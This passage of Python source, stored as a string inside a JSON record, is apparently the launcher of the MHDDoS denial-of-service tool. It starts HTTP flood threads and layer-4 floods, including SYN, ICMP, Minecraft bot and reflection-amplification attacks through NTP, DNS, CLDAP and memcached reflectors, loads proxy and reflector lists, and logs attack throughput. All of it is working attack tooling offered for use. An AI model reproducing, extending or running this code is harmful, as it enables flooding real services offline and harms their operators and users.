HttpFlood(thread_id, url, host, method, rpc, event,\n                              uagents, referers, proxies).start()\n\n            if method in Methods.LAYER4_METHODS:\n                target = URL(urlraw)\n\n                port = target.port\n                target = target.host\n\n                try:\n                    target = gethostbyname(target)\n                except Exception as e:\n                    exit('Cannot resolve hostname ', url.host, e)\n\n                if port > 65535 or port < 1:\n                    exit(\"Invalid Port [Min: 1 / Max: 65535] \")\n\n                if method in {\"NTP\", \"DNS\", \"RDP\", \"CHAR\", \"MEM\", \"CLDAP\", \"ARD\", \"SYN\", \"ICMP\"} and \\\n                        not ToolsConsole.checkRawSocket():\n                    exit(\"Cannot Create Raw Socket\")\n\n                if method in Methods.LAYER4_AMP:\n                    logger.warning(\"this method need spoofable servers please check\")\n                    logger.warning(\"https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack\")\n\n                threads = int(argv[3])\n                timer = int(argv[4])\n                proxies = None\n                ref = None\n\n                if not port:\n                    logger.warning(\"Port Not Selected, Set To Default: 80\")\n                    port = 80\n\n                if method in {\"SYN\", \"ICMP\"}:\n                    __ip__ = __ip__\n\n                if len(argv) >= 6:\n                    argfive = argv[5].strip()\n                    if argfive:\n                        refl_li = Path(__dir__ / \"files\" / argfive)\n                        if method in {\"NTP\", \"DNS\", \"RDP\", \"CHAR\", \"MEM\", \"CLDAP\", \"ARD\"}:\n                            if not refl_li.exists():\n                                exit(\"The reflector file doesn't exist\")\n                            if len(argv) == 7:\n                                logger.setLevel(\"DEBUG\")\n                            ref = set(a.strip()\n                                      for a in Tools.IP.findall(refl_li.open(\"r\").read()))\n                            if not ref: exit(\"Empty Reflector File \")\n\n                        elif argfive.isdigit() and len(argv) >= 7:\n                            if len(argv) == 8:\n                                logger.setLevel(\"DEBUG\")\n                            proxy_ty = int(argfive)\n                            proxy_li = Path(__dir__ / \"files/proxies\" / argv[6].strip())\n                            proxies = handleProxyList(con, proxy_li, proxy_ty)\n                            if method not in {\"MINECRAFT\", \"MCBOT\", \"TCP\", \"CPS\", \"CONNECTION\"}:\n                                exit(\"this method cannot use for layer4 proxy\")\n\n                        else:\n                            logger.setLevel(\"DEBUG\")\n                \n                protocolid = con[\"MINECRAFT_DEFAULT_PROTOCOL\"]\n                \n                if method == \"MCBOT\":\n                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:\n                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))\n                        Tools.send(s, Minecraft.data(b'\\x00'))\n\n                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))\n                        protocolid = con[\"MINECRAFT_DEFAULT_PROTOCOL\"] if not protocolid else int(protocolid.group(1))\n                        \n                        if 47 < protocolid > 758:\n                            protocolid = con[\"MINECRAFT_DEFAULT_PROTOCOL\"]\n\n                for _ in range(threads):\n                    Layer4((target, port), ref, method, event,\n                           proxies, protocolid).start()\n\n            logger.info(\n                f\"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}\"\n                % (target or url.host, method, timer, threads))\n            event.set()\n            ts = time()\n            while time() < ts + timer:\n                logger.debug(\n                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %\n                    (target or url.host,\n                     port or (url.port or 80),\n                     method,\n                     Tools.humanformat(int(REQUESTS_SENT)),\n                     Tools.humanbytes(int(BYTES_SEND)),\n                     round((time() - ts) / timer * 100, 2)))\n                REQUESTS_SENT.set(0)\n                BYTES_SEND.set(0)\n                sleep(1)\n\n            event.clear()\n            exit()\n\n        ToolsConsole.usage()\n"
        }
      ]
    }
  ]
}